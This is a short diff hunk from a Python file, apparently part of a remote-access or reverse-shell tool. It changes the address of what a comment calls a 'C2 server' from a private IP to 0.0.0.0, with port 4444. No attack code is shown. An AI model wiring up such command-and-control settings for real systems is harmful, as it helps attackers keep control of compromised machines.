@@ -931,8 +931,8 @@ def _sheol():
     sys.exit()
 
 def main():
-
-    EIP = '192.168.1.6'
+    # IP/Port to C2 server
+    EIP = '0.0.0.0'
     PRT = 4444
     
     
